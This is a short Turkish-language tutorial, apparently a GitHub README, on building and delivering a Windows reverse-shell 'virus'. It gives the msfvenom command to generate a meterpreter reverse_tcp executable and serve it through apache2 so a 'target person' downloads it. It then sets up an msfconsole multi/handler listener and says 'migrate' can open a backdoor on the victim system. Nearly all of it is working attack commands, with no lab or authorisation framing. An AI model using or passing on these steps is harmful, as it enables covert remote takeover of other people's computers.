## Selam Ben linax Ve Bugun Sizlere Nasil Virus(payload) Nasil Olusturulur Onu Anlaticam.
### Oncelikle Terminali Aciyoruz Ve msfvenom Ile Komutumuzu Yaziyoruz.
### msfvenom -p windows/meterpreter/reverse_tcp LHOST=Local Ipniz LPORT=4444 -f exe > /var/www/html/virus.exe 
  
![Screenshot_2022-07-17_06_44_33](https://user-images.githubusercontent.com/100614268/179394888-468d8bdc-a63e-4727-9d5c-c055d0379a82.png)

### Burada Bilgisayara meterpreter Icin Bir reverse_tcp Olusturmasini Istiyoruz Ve Onu /var/www/html/virus.exe Icerisine Yolluyoruz.
### Daha Sonra Bunu Bir Servicede Aktif Etmemiz Gerek. Aktif Etmeden De Yapilir Ama Hedef Kisiye Daha Rahat Ulasabilmesi Icin Servicelerimizi Acicaz. Bunun Icin Terminale Sirasiyla Yaziyoruz.

### sudo service apache2 start
### sudo service apache2 status
  
![Screenshot_2022-07-17_06_45_23](https://user-images.githubusercontent.com/100614268/179394987-3e5f2793-89de-411e-b523-4f39b78a551e.png)

### Evet Bunun Anlami Artik Bizim Local IP mizi Bir Cihaz Web Tarayicisina Girerse Direk virus.exe yi Download Isticek. Bu Sayede Sadece Hedef Bilgisayara Kendi Local Ipnizi Girerek Bilgisayara payloadi Yerlestire Bilirsiniz. Peki Dosyayi Windowsa Atip Bir Yolla Calistirdiniz Diyelim. Devaminda Ne Yapmamiz Gerek?
  
![Screenshot_2022-07-17_06_45_59](https://user-images.githubusercontent.com/100614268/179395284-d205fc88-c31f-47e7-bf03-d654423a2bf5.png)

### Terminale msfconsole Yaziyoruz. Daha Sonra use multi/handler Yaziyoruz. Sonra show options Yaziyoruz Ve LHOSTU  set lhost 192.168.x.x  Seklinde Yazip local Ipnizi Dinleme Araci Yapiyorsunuz. Ve Artik Hazirsiniz. 
![Screenshot_2022-07-17_06_47_02](https://user-images.githubusercontent.com/100614268/179395205-91bc1d94-6ca9-4c6f-9bb7-e502ade40310.png)

### exploit yada run Komutlarini Girdikten Sonra Windowsa Erisirsiniz. help Yazarak Devam Ede Bilirsiniz. migrate Gibi Komutlarla Da Karsi Sistemde Backdoor Acabilirsiniz.
